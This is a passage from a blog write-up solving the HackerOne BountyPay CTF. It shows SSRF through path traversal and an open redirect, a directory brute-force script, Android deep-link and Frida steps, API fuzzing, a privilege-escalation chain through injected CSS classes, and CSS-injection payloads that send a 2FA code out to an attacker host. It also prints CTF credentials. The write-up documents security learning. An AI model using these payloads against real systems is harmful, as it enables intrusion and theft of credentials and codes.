<p>(<a href="https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=05&amp;year=2020" target="_blank" rel="noopener">https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=05&amp;year=2020</a>)<br><em>Note: Direct access to this endpoint is not possible, there is some secret token added by App.</em> </p>
<p>Remember the notes from Recon? Software is not accessible due to whitelist and Api has Open Redirect.</p>
<p>To reach the Software we need SSRF and to get that, we have:</p>
<ol>
<li>Injection point(/api/accounts/<code>account_id</code>) in URI to Api</li>
<li>OpenRedirect(/redirect?url=) on Api to make the request go to wherever we want.</li>
</ol>
<p>What we dont have yet is traversal in URI to reach /redirect from /api/account/account_id and <code>account_id=../../redirect?url=software# might just work</code>.</p>
<p>After testing the theory, it just worked!<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"account_id"</span>:<span class="string">"../../redirect/?url=https://software.bountypay.h1ctf.com/#"</span>,<span class="attr">"hash"</span>:<span class="string">"de235bffd23df6995ad4e0930baac1a2"</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>We have full-blown SSRF now and we can reach the Software. üí•</strong> </p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/ssrf.png" title="ssrf">
<p>But there is nothing interesting on it. üòï The HTML on Software only had one standard Login form with POST method:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"text-align: center"</span>&gt;</span>Software Storage<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span> <span class="attr">style</span>=<span class="string">"margin-top:50px"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"margin-top:7px"</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">label</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"margin-top:7px"</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">label</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-success pull-right"</span> <span class="attr">value</span>=<span class="string">"Login"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>We just have GET SSRF and we can‚Äôt issue POST SSRF, After trying Scenarios like CRLF, etc. and not getting anything, this SSRF felt almost useless for quite some time. But I was sure that it is meant to hit Software in the scenario. I learned from the initial Login step on App that, If we don‚Äôt have Hint to move forward, all we can do is content discovery üôÇ. Hence wrote a small python script to do Directory brute-force on Software using this SSRF.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">"https://app.bountypay.h1ctf.com:443/statements?month=04&amp;year=2020"</span></span><br><span class="line"></span><br><span class="line">dirs = open(<span class="string">"common-directories.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> dirs:</span><br><span class="line">  token = <span class="string">'&#123;"account_id":"../../redirect/?url=https://software.bountypay.h1ctf.com/'</span>+d+<span class="string">'#","hash":"de235bffd23df6995ad4e0930baac1a2"&#125;'</span></span><br><span class="line">  token = base64.b64encode(token)</span><br><span class="line">  burp0_cookies = &#123;<span class="string">"token"</span>: token&#125;</span><br><span class="line">  data = requests.get(burp0_url,cookies=burp0_cookies).text</span><br><span class="line">  <span class="keyword">print</span> data</span><br></pre></td></tr></table></figure>
<p>And on <a href="https://software.bountypay.h1ctf.com/uploads" target="_blank" rel="noopener">https://software.bountypay.h1ctf.com/uploads</a> we get:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Index of /uploads/<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">"white"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Index of /uploads/<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"../"</span>&gt;</span>../<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/uploads/BountyPay.apk"</span>&gt;</span>BountyPay.apk<span class="tag">&lt;/<span class="name">a</span>&gt;</span>                                        20-Apr-2020 11:264043701<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>A link to an Android APK! <a href="https://software.bountypay.h1ctf.com/uploads/BountyPay.apk" target="_blank" rel="noopener">https://software.bountypay.h1ctf.com/uploads/BountyPay.apk</a> which is directly accessible  üòÅ. Now we download this APK and start analyzing. Turns out it is corrupted. I hackily tried to Fix the corruption, At some point, I even considered to fix this by reading all about PZip. Some cool references:</p>
<ol>
<li><a href="https://fadec0d3.blogspot.com/2017/04/plaidctf-2017-zipper-50.html" target="_blank" rel="noopener">https://fadec0d3.blogspot.com/2017/04/plaidctf-2017-zipper-50.html</a></li>
<li><a href="https://git.zx2c4.com/BruteZip/about/" target="_blank" rel="noopener">https://git.zx2c4.com/BruteZip/about/</a></li>
</ol>
<p>But, After banging my head for some hours, I got to know that I was one of the <strong>unfortunates to reach this step too early</strong>, As it was not intentional to give corrupted APK. Thanks to <a href="https://twitter.com/bbuerhaus" target="_blank" rel="noopener">@Ziot</a> on Hacker101 discord for letting me know that they have fixed the issue and later nahamsec also <a href="https://twitter.com/NahamSec/status/1266586955849953281" target="_blank" rel="noopener">tweeted</a> out about it. But I would have definitely played for hours with corrupted APK if Ziot had not notified.</p>
<h2 id="Android-Challenges"><a href="#Android-Challenges" class="headerlink" title="Android Challenges"></a>Android Challenges</h2><p>Reversing and analyzing the BountyPay App‚Äôs <code>AndroidManifest.xml</code> and Source Code, We get two know that there are 5 activities:</p>
<table>
<thead>
<tr>
<th>Activity</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td>MainActivity</td>
<td>A form that takes Twitter Handle and Username for analytics.</td>
</tr>
<tr>
<td>PartOneActivity</td>
<td>The Activity code Checks if it was opened through DeepLink URI having scheme = <strong><code>one</code></strong> and host = <strong><code>part</code></strong> and has parameter <strong><code>start</code></strong> = <strong><code>PartTwoActivity</code></strong>,  If yes, then it stores that PartOne is solved and starts <code>PartTwoActivity</code>. ADB command to achieve above: <strong>$ adb shell am start -d one://part?start=PartTwoActivity</strong></td>
</tr>
<tr>
<td>PartTwoActivity</td>
<td>Similary this activty too requires a deeplink to solve: <strong>$ adb shell am start -d ‚Äútwo://part?two=light\&amp;switch=on‚Äù</strong>. After that, it makes a text Field and submit button visible. When we submit this form, it compares the String Value from text field with the one it fetched from DataSnapshot. If it is equal then we solve this step and it fires <code>PartThreeActivity</code>. We get this value to be <strong><code>X-Token</code></strong>, I used frida hook to <strong>dump the Strings which are being compared</strong> using handy <a href="https://github.com/iddoeldor/frida-snippets/blob/master/scripts/log_string_builders_and_string_compare.js" target="_blank" rel="noopener">frida-snippet</a>. <strong>$ frida -U -f bounty.pay -l ./frida-snippet.js ‚Äìno-paus</strong> <img src="./activity2.png" alt=""></td>
</tr>
<tr>
<td></td>
</tr>
<tr>
<td>PartThreeActivity</td>
<td>This step too expects us to deduce the DeepLink from SourceCode analysis. It turn out to be: <strong>\$ adb shell am start -d ‚Äúthree://part?three=UGFydFRocmVlQWN0aXZpdHk=\&amp;<br>switch=b24=\&amp;header=X-Token‚Äù</strong> where params are, <code>three = base64(&quot;PartThreeActivity&quot;)</code>, <code>switch = base64(&quot;on&quot;)</code> \&amp; <code>header=X-Token</code>. It then makes a form visible which expects us to submit a valid Hash, we can again dump it out with same <code>frida-snippet</code> as in step two. Hash: <img src="./activity3.1.png" alt=""> After we submit this hash, App fires a POST request and leaks the Host \&amp; Header in logs: <img src="./activity3.2.png" alt=""></td>
</tr>
<tr>
<td>CongratsActivity</td>
<td>It congratulates after solving above 3 steps in sequence! Now we have the <strong>token!</strong> which we did not ealier. This <code>X-Token</code> can be used to <strong>directly access the Api</strong>.</td>
</tr>
</tbody>
</table>
<h2 id="API-OSINT"><a href="#API-OSINT" class="headerlink" title="API + OSINT"></a>API + OSINT</h2><p>Now, we have a hint to work on Api with given <code>X-token</code>. From <code>/statements</code> endpoint on App we know that Api hosts a REST api on <code>/api/*</code>. With this much of little information, a hacker always is left with nothing to do other than more content discovery üôÇ. I fuzzed for API docs/more endpoints on <code>/*</code> and <code>/api/*</code> on <code>api.bountypay.h1ctf.com</code> in a hope to see some hidden endpoints and yep, we do get the hit on <code>/api/staff</code>!</p>
<p><strong>\$ wfuzz ‚Äìhc 404 -H ‚ÄúX-Token: 8e9998ee3137ca9ade8f372739f062c1‚Äù -w wordlist/general/common.txt <a href="https://api.bountypay.h1ctf.com/api/FUZZ" target="_blank" rel="noopener">https://api.bountypay.h1ctf.com/api/FUZZ</a></strong></p>
<p>This confirms that we are on the right path! üò™</p>
<p><a href="https://api.bountypay.h1ctf.com/api/staff" target="_blank" rel="noopener">https://api.bountypay.h1ctf.com/api/staff</a> gives us something interesting:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/get_staff.png" title="staff">
<p>And standard REST Api tests of finding more valid METHODS, Parameters on this endpoint yields:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/post_staff.png" title="staff">
<p>Now we need to find what parameter we are missing and from where it is missing (GET/POST/Content-Type?). </p>
<p>By REST Api constructs we easily can assume that if <code>GET /api/staff</code> gets staff array, then <code>POST /api/staff</code> must be used for Creating new staff object. So let‚Äôs pass it the parameters related to staff. After some time of fuzzing and passing parameters like <code>name</code>, <code>username</code>, <code>staff_id</code> in GET queries \&amp; POST body with different content types, we end up with:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/found_post_param.png" title="staff">
<p>So this indeed is how a valid staff creation POST request looks like! Now we just need to create one account for ourselves. </p>
<p>But unfortunately, nearly 1-2 hours of fuzzing did not result in anything to move forward. At this point, I had tried multiple scenarios from the account takeover scene to weird obscure fuzzing to create a valid staff account.<br><strong>Turns out, I was again one of those few unfortunates who reached this stage too early!</strong> The hint for this next step was given just after I solved this step.</p>
<p>After too much of cosmic fuzzing, I started thinking maybe Fuzzing is not the way forward, like Git repo &amp; Android challenges, there is a another dimension than Web to it. Maybe of OSINT. A scenario like staff leaking credentials on public forum is possible.<br>So I searched for terms like <code>&quot;BountyPay&quot;, &quot;staff_id&quot;, &quot;Sam Jenkins&quot;, &quot;Brian Oliver&quot;, &quot;STF:KE624RQ2T9&quot;</code> on Github, Pastebin, Linkedin, Facebook and at Last on Twitter! and found this tweet(later Hackerone retweeted it to give hint üò¨):</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/bp_tweet.png" title="staff">
<p>We find Sandra in BountyPay HQ‚Äôs following accounts and in her account we find her <a href="https://twitter.com/SandraA76708114/status/1258693001964068864" target="_blank" rel="noopener">uploaded photo</a> of Employee ID card containing what we need, the precious <code>staff_id=STF:8FJ3KFISL3</code></p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/id_sandra.png" title="staff">
<p>Now we have an account of newly joined employee Sandra on Staff.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sandra.allison : s%3D8qB8zEpMnc*xsz7Yp5</span><br></pre></td></tr></table></figure></p>
<p>This marked my 16th hour of continuous hacking on this CTF, after this, I went to sleep üò™</p>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Looking around on the Staff App through Sandra‚Äôs account, We notice some fishy things:</p>
<ol>
<li><code>Template</code> parameter is client-controlled.</li>
<li>A weird way of updating Profile image through CSS(<code>css/style.css</code>) classes by having inline images as base64 encoding served through Data URI.</li>
<li>There is an <code>admin</code> role to some staff accounts.</li>
<li><code>Report This Page</code> feature for admin to visit and see if there is something wrong.</li>
<li>And the most interesting:</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">".upgradeToAdmin"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> t = $(<span class="string">'input[name="username"]'</span>).val();</span><br><span class="line">    $.get(<span class="string">"/admin/upgrade?username="</span> + t, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">"User Upgraded to Admin"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;), $(<span class="string">".tab"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $(<span class="string">".tab"</span>).removeClass(<span class="string">"active"</span>), $(<span class="keyword">this</span>).addClass(<span class="string">"active"</span>), $(<span class="string">"div.content"</span>).addClass(<span class="string">"hidden"</span>), $(<span class="string">"div.content-"</span> + $(<span class="keyword">this</span>).attr(<span class="string">"data-target"</span>)).removeClass(<span class="string">"hidden"</span>), !<span class="number">1</span></span><br><span class="line">&#125;), $(<span class="string">".sendReport"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">"/admin/report?url="</span> + url, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">"Report sent to admin team"</span>)</span><br><span class="line">    &#125;), $(<span class="string">"#myModal"</span>).modal(<span class="string">"hide"</span>)</span><br><span class="line">&#125;), <span class="built_in">document</span>.location.hash.length &gt; <span class="number">0</span> &amp;&amp; (<span class="string">"#tab1"</span> === <span class="built_in">document</span>.location.hash &amp;&amp; $(<span class="string">".tab1"</span>).trigger(<span class="string">"click"</span>), <span class="string">"#tab2"</span> === <span class="built_in">document</span>.location.hash &amp;&amp; $(<span class="string">".tab2"</span>).trigger(<span class="string">"click"</span>), <span class="string">"#tab3"</span> === <span class="built_in">document</span>.location.hash &amp;&amp; $(<span class="string">".tab3"</span>).trigger(<span class="string">"click"</span>), <span class="string">"#tab4"</span> === <span class="built_in">document</span>.location.hash &amp;&amp; $(<span class="string">".tab4"</span>).trigger(<span class="string">"click"</span>));</span><br></pre></td></tr></table></figure>
<p>The <code>/js/website.js</code> Javascript File.</p>
<p>It has an endpoint <code>GET /admin/upgrade?username=</code> which was for upgrading staff to an admin. But only upon admins invoking, it would work. Ohk, so we do have a CSRF-ish feature of <code>Report This Page</code> to admin. So lets report <strong>/admin/upgrade?username=sandra.allision</strong></p>
<p>But the feature has security enabled!<br><code>Pages in the /admin directory will be ignored for security</code></p>
<p>After following every rabbit hole of bypassing this feature I gave up on it and started to look for something else and the last line of JS file caught my eye.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">"#tab1"</span> === <span class="built_in">document</span>.location.hash &amp;&amp; $(<span class="string">".tab1"</span>).trigger(<span class="string">"click"</span>), ..</span><br></pre></td></tr></table></figure>
<p>This is almost useless in the app‚Äôs context, But it does one very interesting thing, and i.e. it triggers click event.</p>
<p>So if <code>#tab2</code> is in the URL, all elements with class tab2 will get their click event triggered. And what if, one of that element has class <code>upgradeToAdmin</code>? Yep the click handler in our JS will fire the <code>GET /admin/upgrade?username=</code>. We also have a way to control CSS of elements through the <code>Update avatar feature</code> which takes an avatar class from the client-side. </p>
<p>So <code>profile_avatar=tab1 upgradeToAdmin</code> and <code>#tab1</code> fragment in URI will trigger the ajax. But we want this to be triggered by admin. We need to report the page to admin where our injected classes are getting reflected? And we do have a unique and relevant page of tickets <code>/?template=ticket&amp;ticket_id=3582</code> where our classes are Reflected in our avatar element üî• So, Reporting <strong>/?template=ticket&amp;ticket_id=3582#tab1</strong> with <strong>profile_avatar=tab1+upgradeToAdmin</strong> will do the trick!</p>
<p>But we are still Just missing one thing of the puzzle.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> t = $(<span class="string">'input[name="username"]'</span>).val();</span><br><span class="line">    $.get(<span class="string">"/admin/upgrade?username="</span> + t, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br></pre></td></tr></table></figure>
<p>we still don‚Äôt have a page to report on which our CSS classes are reflected as well as has an input element with name attribute <code>username</code> &amp; value set to <code>sandra.allison</code> üò¢ </p>
<p>There were two possibilities, either there is HTMLi in the username or we have to use the Login template. The later seemed impossible at the moment so followed a bit of rabbit hole. But the use of the <code>template</code> parameter in query was itchy, it must have some use in CTF or else one could easily develop an app UI without such parameter.</p>
<p>I thought, What If we could load two templates(Login &amp; Ticket) simultaneously with this param, and literally laughed üòÜ But when I fuzzed the template parameter, I was shocked and ecstatic. literally. We can load multiple templates in one page indeed ü§Ø</p>
<p><strong>/?template[0]=login\&amp;template[1]=ticket&amp;ticket_id=3582#tab1</strong></p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/simult-temp.png" title="staff">
<p>It only not loaded two templates, It also respected <code>ticket_id</code> parameter. This definitely showed me that this is not a rabbit hole! Now as I was confident about my partial exploit URL to report to Admin, We still need value populated in input tag as <code>sandra.allison</code>. It was very easy to deduce that we are missing something in our URL, a query parameter probably that will populate input tag, a fair guess is <code>username</code> in the query. And yes! Application reflects it back into Login template in attribute <code>value</code>.</p>
<p>Final Exploit:</p>
<p><strong>/admin/report?url=Base64(?template[0]=login&amp;username=sandra.allison&amp;template[1]=ticket&amp;ticket_id=3582#<br>tab1</strong> )</p>
<p>We report it and Sandra is now Admin! üë∏</p>
<p>This Step was my favorite step in the CTF üß†. The thing I liked was the components(Js &amp; CSS) involved in solution were not just there for CTF, it was actually a working code and yet it gave us Privilege Escalation exploit.</p>
<p>After becoming admin, we get to know that BountyPay‚Äôs admins basically can see customers passwords in plaintext üëÄ, <a href="https://twitter.com/Hacker0x01/status/1266454022124376064" target="_blank" rel="noopener">@Hackerone</a> could have just contacted BountyPay support instead of declaring CTF to get Marten‚Äôs credentials (<strong>marten.mickos : h\&amp;H5wy2Lggj*kKn4OD&amp;Ype</strong>) but where‚Äôs the fun in that üôÇ</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/marten_creds.png" title="staff">
<h2 id="Stealing-Payment-2FA-Code-using-CSS"><a href="#Stealing-Payment-2FA-Code-using-CSS" class="headerlink" title="Stealing Payment 2FA Code using CSS"></a>Stealing Payment 2FA Code using CSS</h2><p>We Login with these creds on App, Again bypassing the Login 2FA with the trick from step 2, Get the May 2020‚Äôs bounties, Click Pay, and ..</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/meme.jpg" title="meme">
<p>Another 2FA challenge! üò®</p>
<p>This time the implementation was different,  First it asked us to send the 2FA challenge code, Then sent a POST request,</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/style_post.png" title="style">
<p>Seems like It‚Äôs taking the URL of a stylesheet which is used for styling the 2FA code page. To just confirm that if it can be changed to our controlled CSS and the execution context we are in:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/collab.png" title="collab">
<p>No, Problem. ‚öîÔ∏è We do have the Awesome research <a href="https://docs.google.com/viewer?url=www.businessinfo.co.uk/labs/talk/The_Sexy_Assassin.ppt" target="_blank" rel="noopener">The Sexy Assassin - Tactical Exploitation using CSS</a> from legendary Gareth Heyes, David Lindsay, and Eduardo Vela. TL;DR, We can exfiltrate the data from the 2FA page sent to Marten if some conditions are met. Attack Methodology from the above research:</p>
<h3 id="CSS-can-Compute"><a href="#CSS-can-Compute" class="headerlink" title="CSS can Compute!"></a>CSS can Compute!</h3><p>How:<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element:condition&#123;</span><br><span class="line">    action;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>So, a CSS payload like:</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value*="secret"]</span>&#123;&#125; &#123;</span><br><span class="line">    <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://attacker.com/?value_contains=secret"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>will successfully exfiltrate the information that one of the input tag on the HTML page contains value <code>secret</code> somewhere. In this way, we can use <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors" target="_blank" rel="noopener">CSS Attribute Selectors</a> for our exfiltration.</p>
<p>So let‚Äôs go step by step to deduce what‚Äôs on the marten‚Äôs payment 2FA page:</p>
<p><strong>1. What elements?</strong><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://tunnel.shoebpatel.com/?input"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://tunnel.shoebpatel.com/?a"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://tunnel.shoebpatel.com/?p"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://tunnel.shoebpatel.com/?div"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>we get the<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">"GET /?div HTTP/1.1" 200 -</span><br><span class="line">"GET /?input HTTP/1.1" 200 -</span><br></pre></td></tr></table></figure></p>
<p>Ok, so we do have \<input\> tags to get the data out of em with payload like:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^="s"]</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://tunnel.shoebpatel.com/?s"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></input\></p>
<p>But as this is a <strong>Blind CSS injection</strong> scenario, we can‚Äôt use classic techniques of exfiltrating the multi-length values, which require the vulnerable page to be iframe-able.* <a href="https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html" target="_blank" rel="noopener">Reference.</a></p>
<p>This leaves us with only one possibility that either the 2FA code is of length one(unlikely) or the challenge author has put code in multiple input tags with each character in one of them!</p>
<p><strong>2. How many &#x3c;input&#x3e;s?</strong><br>To get the idea of how many tags are there, we can use the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-of-type" target="_blank" rel="noopener">:nth-of-type</a> CSS pseudo-class:</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Selects every fourth &lt;input&gt; element with value "s" </span></span><br><span class="line"><span class="comment">   among any group of siblings */</span></span><br><span class="line">   </span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value="s"]</span><span class="selector-pseudo">:nth-of-type(4)</span>&#123;</span><br><span class="line">    <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://tunnel.shoebpatel.com/?its-4th-child"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This will only fire if there are <strong>4 consecutive or more</strong> input tags in a parent element.</p>
<p>We find out that there are <strong>7!</strong></p>
<p>So we can picturize the 2FA code page as following HTML:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span 